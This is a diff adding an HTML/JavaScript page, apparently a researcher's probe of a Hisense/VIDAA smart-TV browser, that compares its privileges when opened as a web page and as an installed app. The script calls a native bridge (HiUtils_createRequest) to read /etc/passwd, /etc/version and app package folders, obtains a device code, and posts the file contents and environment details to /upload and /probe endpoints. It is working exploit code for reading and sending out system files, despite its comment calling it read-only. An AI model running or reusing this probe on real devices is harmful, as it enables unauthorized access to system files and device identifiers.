@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>tv context diff</title>
+<style>
+ body{font:16px/1.3 sans-serif;background:#111;color:#eee;margin:0;padding:16px}
+ h1{font-size:18px;margin:0 0 8px}
+ #log{white-space:pre-wrap;font-family:monospace;font-size:13px}
+ .ok{color:#6f6}.bad{color:#f66}.dim{color:#888}.hit{color:#ff0}
+</style>
+</head>
+<body>
+<h1>контекст: страница против приложения <small class="dim">read-only</small></h1>
+<div id="log"></div>
+<script>
+/* Одна и та же страница открывается дважды: обычным адресом и как
+   установленное приложение. Смотрим, меняется ли идентичность и права.
+   Записи нет: только чтение и один безобидный deviceCode. */
+var API = "", out = { env: {}, reads: [], notes: [] };
+
+function log(m, c) {
+  var el = document.getElementById("log"), d = document.createElement("div");
+  if (c) d.className = c; d.textContent = String(m).slice(0, 380); el.appendChild(d);
+}
+function post(p, o, cb) {
+  try { var x = new XMLHttpRequest(); x.open("POST", API + p, true);
+    x.setRequestHeader("Content-Type", "application/json");
+    x.onreadystatechange = function () { if (x.readyState === 4 && cb) cb(x.status); };
+    x.send(JSON.stringify(o)); } catch (e) { if (cb) cb(0); }
+}
+function js(v) { try { return JSON.stringify(v).slice(0, 400); } catch (e) { return String(v).slice(0, 200); } }
+function call(a, b) { try { return window.HiUtils_createRequest(a, b); } catch (e) { return { thrown: String(e && e.message || e) }; } }
+function safe(f) { try { return String(f()); } catch (e) { return "err:" + (e && e.message || e); } }
+
+var C = window.vowOSContext;
+out.env = {
+  origin: location.origin,
+  href: location.href,
+  userAgent: navigator.userAgent,
+  navAppIdentifier: safe(function () { return navigator.appIdentifier; }),
+  ctxKeys: safe(function () { var a = []; for (var k in C) a.push(k); return a.join(","); }),
+  ctxInit: safe(function () { return C.init(); }),
+  ctxAppIdentifier: safe(function () { return C.getAppIdentifier(); }),
+  ctxAppId: safe(function () { return C.getAppId(); }),
+  serviceIdent: safe(function () { return window.vowOS.service.getIdentifier(); }),
+  hasFileRead: String(typeof window.Hisense_FileRead),
+  hasInstallApp: String(typeof window.Hisense_installApp),
+  fnCount: (function () { var n = 0; for (var k in window) if (/^Hisense_/.test(k)) n++; return n; })()
+};
+for (var k in out.env) log(k + " = " + out.env[k], k === "ctxInit" || k === "ctxAppIdentifier" ? "hit" : "dim");
+
+/* чтения в этом контексте */
+var TARGETS = ["/etc/version", "/etc/passwd", "APPS:pkgs/tv.vidaa.app.browser/", "APPS:pkgs/"];
+var i = 0;
+(function one() {
+  if (i >= TARGETS.length) return dev();
+  var p = TARGETS[i++];
+  var r = call("fileRead", { path: p });
+  var ok = !!(r && r.ret);
+  out.reads.push({ path: p, ret: ok, result: js(r) });
+  log((ok ? "ok   " : "err  ") + p + " -> " + js(r).slice(0, 160), ok ? "ok" : "bad");
+  post("/upload", { path: p, type: "file", strategy: "fileRead",
+    status: ok ? "ok" : "error",
+    data: ok ? (typeof r.msg === "string" ? r.msg : JSON.stringify(r.msg)) : null,
+    error: ok ? null : js(r) }, function () { setTimeout(one, 120); });
+})();
+
+function dev() {
+  var d = call("deviceCode");
+  out.notes.push({ deviceCode: js(d) });
+  log("deviceCode -> " + js(d).slice(0, 200), js(d).indexOf("503") < 0 ? "ok" : "bad");
+  post("/probe", Object.assign({ name: "context-diff" }, out), function (st) {
+    log(st === 200 ? "готово: отправлено" : "ошибка отправки " + st, st === 200 ? "ok" : "bad");
+  });
+}
+</script>
+</body>
+</html>
